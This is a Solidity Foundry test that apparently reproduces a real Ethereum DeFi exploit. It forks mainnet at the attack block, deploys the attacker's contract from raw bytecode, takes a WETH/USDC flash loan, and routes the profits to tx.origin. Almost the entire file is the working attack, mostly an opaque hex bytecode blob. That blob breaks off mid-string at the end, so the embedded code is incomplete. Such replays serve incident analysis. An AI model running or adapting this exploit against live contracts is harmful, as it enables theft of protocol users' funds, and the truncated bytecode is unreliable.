// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0xefc4ac015069fdf9946997be0459db44c0491221159220be782454c32ec2d651
// https://etherscan.io/address/0x5C75e94dD0Ab9c10BFd1B8073DafEF031D3c050d

struct S1 {
    uint256 p1;
    uint256 p2;
    uint256 p3;
    uint256 p4;
    uint256 p5;
    uint256 p6;
    uint256 p7;
    address p8;
    address p9;
}

interface I {
    function doActionWithLeverage(uint256, address, address, bytes memory, bytes3) external payable;
    function transferFrom(address, address, uint256) external payable;
    function liquidateVault(address) external payable;
    function flashLoan(address, address[] memory, uint256[] memory, uint256[] memory, address, bytes memory, uint16)
        external
        payable;
    function createVault(uint256, uint16, address) external payable;
    function approve(address, uint256) external payable;
    function withdraw(uint256) external payable;
    function transfer(address, uint256) external payable;
    function vaultManagementAction(address, bytes memory) external payable;
    function balanceOf(address) external payable returns (uint256);
    function openTrustedMarginAccount(address) external payable;
    function deposit(address[] memory, uint256[] memory, uint256[] memory) external payable;
}

contract X56a3 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xefc4ac015069fdf9946997be0459db44c0491221159220be782454c32ec2d651");
    }

    address constant x00cb = 0x00CB53780Ea58503D3059FC02dDd596D0Be926cB;
    address constant x2de7 = 0x2dE7BbAAaB48EAc228449584f94636bb20d63E65;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x8787 = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant x9aa0 = 0x9aa024D3fd962701ED17F76c17CaB22d3dc9D92d;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xd417 = 0xD417c28aF20884088F600e724441a3baB38b22cc;

    address x25f1;
    address x95d5;
    address xa030;
    address xe9d3;

    function test1() public {
        vm.createSelectFork("http://localhost:18545", 17659972); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x577a9ea2d99c9e51b2784976cdd042278f25a4e6ed001a2667cb7b9119c27e4d));

        // https://explorer.phalcon.xyz/tx/eth/0x577a9ea2d99c9e51b2784976cdd042278f25a4e6ed001a2667cb7b9119c27e4d
        this.x577a9ea2();
        bytes32 initcodeHash1 = keccak256(abi.encodePacked(type(X25f1).creationCode, abi.encode(x95d5, r)));
        x25f1 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("1"), initcodeHash1)))));
        bytes32 initcodeHash2 = keccak256(abi.encodePacked(type(Xa030).creationCode, abi.encode(r, xe9d3)));
        xa030 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("2"), initcodeHash2)))));
        // https://explorer.phalcon.xyz/tx/eth/0xefc4ac015069fdf9946997be0459db44c0491221159220be782454c32ec2d651
        x278ee0c5();
    }

    function test2() public {
        vm.createSelectFork("http://localhost:18545", 17659971); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x577a9ea2d99c9e51b2784976cdd042278f25a4e6ed001a2667cb7b9119c27e4d
        this.x577a9ea2();
        vm.warp(1688952119);
        vm.roll(17659972);
        bytes32 initcodeHash1 = keccak256(abi.encodePacked(type(X25f1).creationCode, abi.encode(x95d5, r)));
        x25f1 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("1"), initcodeHash1)))));
        bytes32 initcodeHash2 = keccak256(abi.encodePacked(type(Xa030).creationCode, abi.encode(r, xe9d3)));
        xa030 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("2"), initcodeHash2)))));
        // https://explorer.phalcon.xyz/tx/eth/0xefc4ac015069fdf9946997be0459db44c0491221159220be782454c32ec2d651
        x278ee0c5();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 17659972); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1688952119);
        vm.roll(17659973);
        bytes32 initcodeHash1 = keccak256(abi.encodePacked(type(X25f1).creationCode, abi.encode(x95d5, r)));
        vm.deal(RECEIVER, 10 ether);
        vm.store(
            address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48),
            keccak256(abi.encode(RECEIVER, uint256(9))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
            keccak256(abi.encode(RECEIVER, uint256(3))),
            bytes32(uint256(1000000000000000000000000))
        );
        x25f1 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("1"), initcodeHash1)))));
        bytes32 initcodeHash2 = keccak256(abi.encodePacked(type(Xa030).creationCode, abi.encode(r, xe9d3)));
        xa030 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("2"), initcodeHash2)))));
        // https://explorer.phalcon.xyz/tx/eth/0xefc4ac015069fdf9946997be0459db44c0491221159220be782454c32ec2d651
        x278ee0c5();
    }

    function x577a9ea2() public {
        _constructor_();
    }

    function x278ee0c5() public {
        // uint256 v1 = 12048400837639563498;
        uint256 v1 = I(xc02a).balanceOf(xd417);
        console2.log("I(xc02a).balanceOf(xd417)\t->", "12048400837639563498 (12.4840 ether)");
        // uint256 v2 = 103360989567;
        uint256 v2 = I(xa0b8).balanceOf(x9aa0);
        console2.log("I(xa0b8).balanceOf(x9aa0)\t->", uint256(103360989567));

        address[] memory arr01 = new address[](2);
        arr01[0] = xc02a;
        arr01[1] = xa0b8;
        uint256[] memory arr02 = new uint256[](2);
        arr02[0] = 2409680167527912699;
        arr02[1] = 20672197913;
        uint256[] memory arr03 = new uint256[](2);
        arr03[0] = 0;
        arr03[1] = 0;
        I(x8787).flashLoan(r, arr01, arr02, arr03, r, hex"61617665", 0);

        // uint256 v3 = 103200653468;
        uint256 v3 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(103200653468));
        I(xa0b8).transfer(tx.origin, v3);
        // uint256 v4 = 103200653468;
        uint256 v4 = I(xa0b8).balanceOf(tx.origin);
        console2.log("I(xa0b8).balanceOf(tx.origin)\t->", uint256(103200653468));
        // uint256 v5 = 11047195997555799542;
        uint256 v5 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "11047195997555799542 (11.4719 ether)");
        I(xc02a).withdraw(v5);
        address(tx.origin).call{value: 11047195997555799542}("");
    }

    function call() public payable {}

    function _constructor_() public {
        bytes memory rt =
            hex"608060405260043610620000835760003560e01c80635a63fbc911620000515780635a63fbc9146200011457806382fa50621462000142578063920f5c841462000167578063d7adbdf1146200019d57005b80631dad5942146200008d578063278ee0c514620000b25780633b9a09b714620000ca57806358ea750114620000ef57005b366200008b57005b005b3480156200009a57600080fd5b506200008b620000ac36600462001f39565b620001b5565b348015620000bf57600080fd5b506200008b620002a4565b348015620000d757600080fd5b506200008b620000e936600462001f95565b6200087e565b348015620000fc57600080fd5b506200008b6200010e36600462002065565b62000991565b3480156200012157600080fd5b50600c546040516001600160a01b0390911681526020015b60405180910390f35b3480156200014f57600080fd5b506200008b620001613660046200208c565b62000af1565b3480156200017457600080fd5b506200018c620001863660046200210a565b62000b92565b604051901515815260200162000139565b348015620001aa57600080fd5b506200008b62000d30565b33620001c9600c546001600160a01b031690565b6001600160a01b031614620001fb5760405162461bcd60e51b8152600401620001f2906200221f565b60405180910390fd5b600c546001600160a01b03163214620002285760405162461bcd60e51b8152600401620001f2906200221f565b60405163a9059cbb60e01b81526001600160a01b0384169063a9059cbb9062000258908590859060040162002240565b6020604051808303816000875af115801562000278573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200029e919062002259565b50505050565b33620002b8600c546001600160a01b031690565b6001600160a01b031614620002e15760405162461bcd60e51b8152600401620001f2906200221f565b600c546001600160a01b031632146200030e5760405162461bcd60e51b8152600401620001f2906200221f565b604080516002808252606082018352600092602083019080368337505060408051600280825260608201835293945060009390925090602083019080368337505060408051600280825260608201835293945060009390925090602083019080368337505060025484519293506001600160a01b0316918491506000906200039a576200039a6200227d565b6001600160a01b039283166020918202929092010152600354835191169083906001908110620003ce57620003ce6200227d565b6001600160a01b0392831660209182029290920101526002546007546040516370a0823160e01b8152908316600482015260059291909116906370a0823190602401602060405180830381865afa1580156200042e573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000454919062002293565b620004609190620022c3565b836000815181106200047657620004766200227d565b60209081029190910101526003546008546040516370a0823160e01b81526001600160a01b03918216600482015260059291909116906370a0823190602401602060405180830381865afa158015620004d3573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620004f9919062002293565b620005059190620022c3565b836001815181106200051b576200051b6200227d565b6020908102919091018101919091526001546040805180820182526004808252636161766560e01b94820194909452905163ab9c4b5d60e01b81526001600160a01b039092169263ab9c4b5d926200058192309288928a928992869260009101620023b2565b600060405180830381600087803b1580156200059c57600080fd5b505af1158015620005b1573d6000803e3d6000fd5b50506003546040516370a0823160e01b8152306004820152600093506001600160a01b0390911691506370a0823190602401602060405180830381865afa15801562000601573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000627919062002293565b600354600c5460405163a9059cbb60e01b81529293506001600160a01b039182169263a9059cbb9262000661921690859060040162002240565b6020604051808303816000875af115801562000681573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620006a7919062002259565b50600354600c546040516370a0823160e01b81526001600160a01b039182166004820152839291909116906370a0823190602401602060405180830381865afa158015620006f9573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200071f919062002293565b1015620007405760405162461bcd60e51b8152600401620001f2906200221f565b6002546040516370a0823160e01b81523060048201526001600160a01b0390911690632e1a7d4d9082906370a0823190602401602060405180830381865afa15801562000791573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620007b7919062002293565b6040518263ffffffff1660e01b8152600401620007d691815260200190565b600060405180830381600087803b158015620007f157600080fd5b505af115801562000806573d6000803e3d6000fd5b5050600c546040514793506001600160a01b03909116915082156108fc029083906000818181858888f1935050505015801562000847573d6000803e3d6000fd5b50600c546001600160a01b031631811115620008775760405162461bcd60e51b8152600401620001f2906200221f565b5050505050565b3362000892600c546001600160a01b031690565b6001600160a01b031614620008bb5760405162461bcd60e51b8152600401620001f2906200221f565b600c546001600160a01b03163214620008e85760405162461bcd60e51b8152600401620001f2906200221f565b6000826001600160a01b03168260405162000904919062002438565b6000604051808303816000865af19150503d806000811462000943576040519150601f19603f3d011682016040523d82523d6000602084013e62000948565b606091505b50509050806200098c5760405162461bcd60e51b815260206004820152600e60248201526d63616c6c20756e7375636365737360901b6044820152606401620001f2565b505050565b33620009a5600c546001600160a01b031690565b6001600160a01b031614620009ce5760405162461bcd60e51b8152600401620001f2906200221f565b600c546001600160a01b03163214620009fb5760405162461bcd60e51b8152600401620001f2906200221f565b806001600160a01b031663a9059cbb62000a1d600c546001600160a01b031690565b6040516370a0823160e01b81523060048201526001600160a01b038516906370a0823190602401602060405180830381865afa15801562000a62573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000a88919062002293565b6040518363ffffffff1660e01b815260040162000aa792919062002240565b6020604051808303816000875af115801562000ac7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000aed919062002259565b5050565b3362000b05600c546001600160a01b031690565b6001600160a01b03161462000b2e5760405162461bcd60e51b8152600401620001f2906200221f565b600c546001600160a01b0316321462000b5b5760405162461bcd60e51b8152600401620001f2906200221f565b6040516001600160a01b0383169082156108fc029083906000818181858888f193505050501580156200098c573d6000803e3d6000fd5b600c546000906001600160a01b0316321462000bc25760405162461bcd60e51b8152600401620001f2906200221f565b6001546001600160a01b0316330362000d1f5762000c1388888080602002602001604051908101604052809392919081815260200183836020028082843760009201919091525062000dd792505050565b60025460015460405163095ea7b360e01b81526001600160a01b039283169263095ea7b39262000c4d929116906000199060040162002240565b6020604051808303816000875af115801562000c6d573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000c93919062002259565b5060035460015460405163095ea7b360e01b81526001600160a01b039283169263095ea7b39262000cce929116906000199060040162002240565b6020604051808303816000875af115801562000cee573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000d14919062002259565b506001905062000d23565b5060015b9998505050505050505050565b3362000d44600c546001600160a01b031690565b6001600160a01b03161462000d6d5760405162461bcd60e51b8152600401620001f2906200221f565b600c546001600160a01b0316321462000d9a5760405162461bcd60e51b8152600401620001f2906200221f565b600c546040516001600160a01b03909116904780156108fc02916000818181858888f1935050505015801562000dd4573d6000803e3d6000fd5b50565b600c546001600160a01b0316321462000e185760405162461bcd60e51b8152602060048201526002602482015261647760f01b6044820152606401620001f2565b6009546001600160a01b0316321462000e455760405162461bcd60e51b8152600401620001f2906200221f565b600554600a80546001600160a01b039092169163fdd6858c91600062000e6b8362002456565b9091555060025460405160e084901b6001600160e01b03191681526004810192909252600160248301526001600160a01b031660448201526064016020604051808303816000875af115801562000ec6573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000eec919062002472565b600080546001600160a01b0319166001600160a01b03928316908117909155600754604051630f60935360e41b8152921660048301529063f609353090602401600060405180830381600087803b15801562000f4757600080fd5b505af115801562000f5c573d6000803e3d6000fd5b50600092506001915062000f6d9050565b60405190808252806020026020018201604052801562000f97578160200160208202803683370190505b506040805160018082528183019092529192506000919060208083019080368337505060025482519293506001600160a01b03169183915060009062000fe15762000fe16200227d565b6001600160a01b0392909216602092830291909101909101526040805160018082528183019092526000918160200160208202803683375050604080516001808252818301909252929350600092915060208083019080368337019050509050846000815181106200105757620010576200227d565b6020026020010151816000815181106200107557620010756200227d565b602090810291909101015260025460005460405163095ea7b360e01b81526001600160a01b039283169263095ea7b392620010ba929116906000199060040162002240565b6020604051808303816000875af1158015620010da573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001100919062002259565b5060005460405163656e872960e01b81526001600160a01b039091169063656e872990620011379086908690869060040162002492565b600060405180830381600087803b1580156200115257600080fd5b505af115801562001167573d6000803e3d6000fd5b5050505060006060620011a26040518060a0016040528060608152602001606081526020016060815260200160608152602001606081525090565b620011d56040518060a0016040528060608152602001606081526020016060815260200160608152602001606081525090565b868152602081018890526040808201899052606082018990526080820189905280516001808252818301909252600091816020016020820280368337505060025482519293506001600160a01b0316918391506000906200123a576200123a6200227d565b6001600160a01b039290921660209283029190910190910152604080516001808252818301909252600091816020015b60608152602001906001900390816200126a57505060005460405191925063095ea7b360e01b91620012ad916001600160a01b0316906000199060240162002240565b604051602081830303815290604052906001600160e01b0319166020820180516001600160e01b03838183161783525050505081600081518110620012f657620012f66200227d565b6020026020010181905250838383836040516020016200131a94939291906200259b565b60408051808303601f19018152908290526007546002546370a0823160e01b84526001600160a01b03918216600485018190529298509192637bfbb80292670de0b6b3a76400009216906370a0823190602401602060405180830381865afa1580156200138b573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620013b1919062002293565b620013bd919062002641565b6000546006546040516001600160e01b031960e086901b168152620013f893926001600160a01b039081169216908b908d906004016200265d565b600060405180830381600087803b1580156200141357600080fd5b505af115801562001428573d6000803e3d6000fd5b50506000546040516001600160a01b03909116925062001449915062001f15565b6001600160a01b039091168152602001604051809103906000f08015801562001476573d6000803e3d6000fd5b50600b60006101000a8154816001600160a01b0302191690836001600160a01b03160217905550620014d06040518060a0016040528060608152602001606081526020016060815260200160608152602001606081525090565b8981526002546000546040516370a0823160e01b81526001600160a01b0391821660048201529116906370a0823190602401602060405180830381865afa15801562001520573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001546919062002293565b886000815181106200155c576200155c6200227d565b60209081029190910181019190915260408281018a90529082018c90528051600280825260608201909252600091816020016020820280368337505060025482519293506001600160a01b031691839150600090620015bf57620015bf6200227d565b6001600160a01b039283166020918202929092010152600b54825191169082906001908110620015f357620015f36200227d565b6001600160a01b03929092166020928302919091019091015260408051600280825260608201909252600091816020015b606081526020019060019003908162001624575050600b5460405191925063095ea7b360e01b9162001667916001600160a01b0316906000199060240162002240565b604051602081830303815290604052906001600160e01b0319166020820180516001600160e01b03838183161783525050505081600081518110620016b057620016b06200227d565b60209081029190910181019190915260408051600481526024810190915290810180516001600160e01b031663b5d456a760e01b179052815182906001908110620016ff57620016ff6200227d565b6020026020010181905250828783836040516020016200172394939291906200259b565b60408051601f19818403018152908290526000546006546326a00d1b60e11b8452919a506001600160a01b0390811692634d401a36926200176b9216908c90600401620026ab565b60408051808303816000875af11580156200178a573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620017b09190620026d9565b5050600554600a80546001600160a01b039092169163fdd6858c916000620017d88362002456565b9091555060035460405160e084901b6001600160e01b03191681526004810192909252600160248301526001600160a01b031660448201526064016020604051808303816000875af115801562001833573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001859919062002472565b600080546001600160a01b0319166001600160a01b03928316908117909155600854604051630f60935360e41b8152921660048301529063f609353090602401600060405180830381600087803b158015620018b457600080fd5b505af1158015620018c9573d6000803e3d6000fd5b50506003548e516001600160a01b0390911692508e9150600090620018f257620018f26200227d565b60200260200101906001600160a01b031690816001600160a01b0316815250508d6001815181106200192857620019286200227d565b60200260200101518a6000815181106200194657620019466200227d565b602090810291909101015260035460005460405163095ea7b360e01b81526001600160a01b039283169263095ea7b3926200198b929116906000199060040162002240565b6020604051808303816000875af1158015620019ab573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620019d1919062002259565b5060005460405163656e872960e01b81526001600160a01b039091169063656e87299062001a08908f908f908f9060040162002492565b600060405180830381600087803b15801562001a2357600080fd5b505af115801562001a38573d6000803e3d6000fd5b5050508c87525060035485516001600160a01b0390911690869060009062001a645762001a646200227d565b6001600160a01b03928316602091820292909201015260005460405163095ea7b360e01b9262001a9d9216906000199060240162002240565b604051602081830303815290604052906001600160e01b0319166020820180516001600160e01b0383818316178352505050508460008151811062001ae65762001ae66200227d565b60200260200101819052508686868660405160200162001b0a94939291906200259b565b60408051808303601f19018152908290526008546003546370a0823160e01b84526001600160a01b0391821660048501819052929b509192637bfbb802926308f0d1809216906370a0823190602401602060405180830381865afa15801562001b77573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001b9d919062002293565b62001ba9919062002641565b60008054906101000a90046001600160a01b0316600660009054906101000a90046001600160a01b03168c8e6040518663ffffffff1660e01b815260040162001bf79594939291906200265d565b600060405180830381600087803b15801562001c1257600080fd5b505af115801562001c27573d6000803e3d6000fd5b50506000546040516001600160a01b03909116925062001c48915062001f15565b6001600160a01b039091168152602001604051809103906000f08015801562001c75573d6000803e3d6000fd5b50600b80546001600160a01b0319166001600160a01b039283161790558c84526003546000546040516370a0823160e01b815290831660048201529116906370a0823190602401602060405180830381865afa15801562001cda573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001d00919062002293565b8a60008151811062001d165762001d166200227d565b6020908102919091010152604083018a905260035482516001600160a01b0390911690839060009062001d4d5762001d4d6200227d565b6001600160a01b039283166020918202929092010152600b5483519116908390600190811062001d815762001d816200227d565b6001600160a01b039283166020918202929092010152600b5460405163095ea7b360e01b9262001dba9216906000199060240162002240565b604051602081830303815290604052906001600160e01b0319166020820180516001600160e01b0383818316178352505050508160008151811062001e035762001e036200227d565b60209081029190910181019190915260408051600481526024810190915290810180516001600160e01b03166387fe9a9360e01b17905281518290600190811062001e525762001e526200227d565b60200260200101819052508287838360405160200162001e7694939291906200259b565b60408051601f19818403018152908290526000546006546326a00d1b60e11b8452919a506001600160a01b0390811692634d401a369262001ebe9216908c90600401620026ab565b60408051808303816000875af115801562001edd573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001f039190620026d9565b50505050505050505050505050505050565b61103d806200270b83390190565b6001600160a01b038116811462000dd457600080fd5b60008060006060848603121562001f4f57600080fd5b833562001f5c8162001f23565b9250602084013562001f6e8162001f23565b929592945050506040919091013590565b634e487b7160e01b600052604160045260246000fd5b6000806040838503121562001fa957600080fd5b823562001fb68162001f23565b9150602083013567ffffffffffffffff8082111562001fd457600080fd5b818501915085601f83011262001fe957600080fd5b81358181111562001ffe5762001ffe62001f7f565b604051601f8201601f19908116603f0116810190838211818310171562002029576200202962001f7f565b816040528281528860208487010111156200204357600080fd5b8260208601602083013760006020848301015280955050505050509250929050565b6000602082840312156200207857600080fd5b8135620020858162001f23565b9392505050565b60008060408385031215620020a057600080fd5b8235620020ad8162001f23565b946020939093013593505050565b60008083601f840112620020ce57600080fd5b50813567ffffffffffffffff811115620020e757600080fd5b6020830191508360208260051b85010111156200210357600080fd5b9250929050565b600080600080600080600080600060a08a8c0312156200212957600080fd5b893567ffffffffffffffff808211156200214257600080fd5b620021508d838e01620020bb565b909b50995060208c01359150808211156200216a57600080fd5b620021788d838e01620020bb565b909950975060408c01359150808211156200219257600080fd5b620021a08d838e01620020bb565b909750955060608c01359150620021b78262001f23565b90935060808b01359080821115620021ce57600080fd5b818c0191508c601f830112620021e357600080fd5b813581811115620021f357600080fd5b8d60208285010111156200220657600080fd5b6020830194508093505050509295985092959850929598565b60208082526007908201526670726f626c656d60c81b604082015260600190565b6001600160a01b03929092168252602082015260400190565b6000602082840312156200226c57600080fd5b815180151581146200208557600080fd5b634e487b7160e01b600052603260045260246000fd5b600060208284031215620022a657600080fd5b5051919050565b634e487b7160e01b600052601160045260246000fd5b600082620022e157634e487b7160e01b600052601260045260246000fd5b500490565b600081518084526020808501945080840160005b83811015620023215781516001600160a01b031687529582019590820190600101620022fa565b509495945050505050565b600081518084526020808501945080840160005b83811015620023215781518752958201959082019060010162002340565b60005b838110156200237b57818101518382015260200162002361565b50506000910152565b600081518084526200239e8160208601602086016200235e565b601f01601f19169290920160200192915050565b600060018060a01b03808a16835260e06020840152620023d660e084018a620022e6565b8381036040850152620023ea818a6200232c565b905083810360608501526200240081896200232c565b9050818716608085015283810360a08501526200241e818762002384565b9250505061ffff831660c083015298975050505050505050565b600082516200244c8184602087016200235e565b9190910192915050565b6000600182016200246b576200246b620022ad565b5060010190565b6000602082840312156200248557600080fd5b8151620020858162001f23565b606081526000620024a76060830186620022e6565b8281036020840152620024bb81866200232c565b90508281036040840152620024d181856200232c565b9695505050505050565b805160a080845281519084018190526000916020919082019060c0860190845b81811015620025225783516001600160a01b031683529284019291840191600101620024fb565b5050828501519150858103838701526200253d81836200232c565b92505050604083015184820360408601526200255a82826200232c565b915050606083015184820360608601526200257682826200232c565b915050608083015184820360808601526200259282826200232c565b95945050505050565b608081526000620025b06080830187620024db565b602083820381850152620025c58288620024db565b91508382036040850152620025db8287620022e6565b915083820360608501528185518084528284019150828160051b85010183880160005b838110156200263057601f198784030185526200261d83835162002384565b94860194925090850190600101620025fe565b50909b9a5050505050505050505050565b81810381811115620026575762002657620022ad565b92915050565b8581526001600160a01b0385811660208301528416604082015260a060608201819052600090620026919083018562002384565b905062ffffff60e81b831660808301529695505050505050565b6001600160a01b0383168152604060208201819052600090620026d19083018462002384565b949350505050565b60008060408385031215620026ed57600080fd5b8251620026fa8162001f23565b602093909301519294929350505056fe6080604052600080546001600160a01b03199081167387870bca3f3fd6335c3f4ce8392d69350b4fa4e21790915560018054821673c02aaa39b223fe8d0a0e5c4f27ead9083c756cc217905560028054821673a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4817905560038054821673ba12222222228d8ba445958a75a0704d566bf2c817905560048054821672cb53780ea58503d3059fc02ddd596d0be926cb179055600580548216732de7bbaaab48eac228449584f94636bb20d63e6517905560068054821673d417c28af20884088f600e724441a3bab38b22cc179055600780548216739aa024d3fd962701ed17f76c17cab22d3dc9d92d17905560098054909116735c75e94dd0ab9c10bfd1b8073dafef031d3c050d17905534801561012957600080fd5b5060405161103d38038061103d833981016040819052610148916101ca565b6009546001600160a01b0316321461018c5760405162461bcd60e51b815260206004820152600360248201526266657360e81b604482015260640160405180910390fd5b600a80546001600160a01b0319908116321790915560088054821633179055600b80546001600160a01b0393909316929091169190911790556101fa565b6000602082840312156101dc57600080fd5b81516001600160a01b03811681146101f357600080fd5b9392505050565b610e34806102096000396000f3fe6080604052600436106100bd5760003560e01c806358ea75011161007957806382fa50621161005657806382fa5062146101e757806387fe9a9314610207578063b5d456a71461021c578063d7adbdf11461023157005b806358ea75011461017b5780635a63fbc91461019b5780635c206c36146101c757005b80631dad5942146100c65780631ec6801d146100e65780632fc4580c1461010657806336d7ff711461011b5780633b9a09b71461013b5780635535eba21461015b57005b366100c457005b005b3480156100d257600080fd5b506100c46100e1366004610c13565b610246565b3480156100f257600080fd5b506100c4610101366004610c13565b61032b565b34801561011257600080fd5b506100c4610355565b34801561012757600080fd5b506100c4610136366004610c4f565b6103bb565b34801561014757600080fd5b506100c4610156366004610c8f565b610420565b34801561016757600080fd5b506100c4610176366004610d51565b610521565b34801561018757600080fd5b506100c4610196366004610d51565b610647565b3480156101a757600080fd5b50600a54604080516001600160a01b039092168252519081900360200190f35b3480156101d357600080fd5b506100c46101e2366004610c8f565b6106aa565b3480156101f357600080fd5b506100c4610202366004610c4f565b6106d4565b34801561021357600080fd5b506100c4610737565b34801561022857600080fd5b506100c461097e565b34801561023d57600080fd5b506100c4610b94565b33610259600a546001600160a01b031690565b6001600160a01b0316146102885760405162461bcd60e51b815260040161027f90610d73565b60405180910390fd5b600a546001600160a01b031632146102b25760405162461bcd60e51b815260040161027f90610d73565b60405163a9059cbb60e01b81526001600160a01b0383811660048301526024820183905284169063a9059cbb906044016020604051808303816000875af1158015610301573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103259190610d94565b50505050565b6008546001600160a01b031632146102b25760405162461bcd60e51b815260040161027f90610d73565b6008546001600160a01b0316321461037f5760405162461bcd60e51b815260040161027f90610d73565b600a546040516001600160a01b03909116904780156108fc02916000818181858888f193505050501580156103b8573d6000803e3d6000fd5b50565b6008546001600160a01b031632146103e55760405162461bcd60e51b815260040161027f90610d73565b6040516001600160a01b0383169082156108fc029083906000818181858888f1935050505015801561041b573d6000803e3d6000fd5b505050565b33610433600a546001600160a01b031690565b6001600160a01b0316146104595760405162461bcd60e51b815260040161027f90610d73565b600a546001600160a01b031632146104835760405162461bcd60e51b815260040161027f90610d73565b6000826001600160a01b03168260405161049d9190610db6565b6000604051808303816000865af19150503d80600081146104da576040519150601f19603f3d011682016040523d82523d6000602084013e6104df565b606091505b505090508061041b5760405162461bcd60e51b815260206004820152600e60248201526d63616c6c20756e7375636365737360901b604482015260640161027f565b6008546001600160a01b0316321461054b5760405162461bcd60e51b815260040161027f90610d73565b806001600160a01b031663a9059cbb61056c600a546001600160a01b031690565b6040516370a0823160e01b81523060048201526001600160a01b038516906370a0823190602401602060405180830381865afa1580156105b0573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105d49190610de5565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af115801561061f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106439190610d94565b5050565b3361065a600a546001600160a01b031690565b6001600160a01b0316146106805760405162461bcd60e51b815260040161027f90610d73565b600a546001600160a01b0316321461054b5760405162461bcd60e51b815260040161027f90610d73565b6008546001600160a01b031632146104835760405162461bcd60e51b815260040161027f90610d73565b336106e7600a546001600160a01b031690565b6001600160a01b03161461070d5760405162461bcd60e51b815260040161027f90610d73565b600a546001600160a01b031632146103e55760405162461bcd60e51b815260040161027f90610d73565b600a546001600160a01b031632146107615760405162461bcd60e51b815260040161027f90610d73565b6005546001600160a01b0316331461078b5760405162461bcd60e51b815260040161027f90610d73565b6002546005546040516370a0823160e01b81526001600160a01b03918216600482015260009291909116906370a0823190602401602060405180830381865afa1580156107dc573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108009190610de5565b6002546005546008546040516323b872dd60e01b81526001600160a01b03928316600482015290821660248201526044810184905292935016906323b872dd906064016020604051808303816000875af1158015610862573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108869190610d94565b506002546008546040516370a0823160e01b81526001600160a01b039182166004820152839291909116906370a0823190602401602060405180830381865afa1580156108d7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108fb9190610de5565b10156109195760405162461bcd60e51b815260040161027f90610d73565b600754600b546040516306535d2560e21b81526001600160a01b03918216600482015291169063194d7494906024015b600060405180830381600087803b15801561096357600080fd5b505af1158015610977573d6000803e3d6000fd5b5050505050565b600a546001600160a01b031632146109a85760405162461bcd60e51b815260040161027f90610d73565b6005546001600160a01b031633146109d25760405162461bcd60e51b815260040161027f90610d73565b6001546005546040516370a0823160e01b81526001600160a01b03918216600482015260009291909116906370a0823190602401602060405180830381865afa158015610a23573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a479190610de5565b6001546005546008546040516323b872dd60e01b81526001600160a01b03928316600482015290821660248201526044810184905292935016906323b872dd906064016020604051808303816000875af1158015610aa9573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610acd9190610d94565b506001546008546040516370a0823160e01b81526001600160a01b039182166004820152839291909116906370a0823190602401602060405180830381865afa158015610b1e573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b429190610de5565b1015610b605760405162461bcd60e51b815260040161027f90610d73565b600654600b546040516306535d2560e21b81526001600160a01b03918216600482015291169063194d749490602401610949565b33610ba7600a546001600160a01b031690565b6001600160a01b031614610bcd5760405162461bcd60e51b815260040161027f90610d73565b600a546001600160a01b0316321461037f5760405162461bcd60e51b815260040161027f90610d7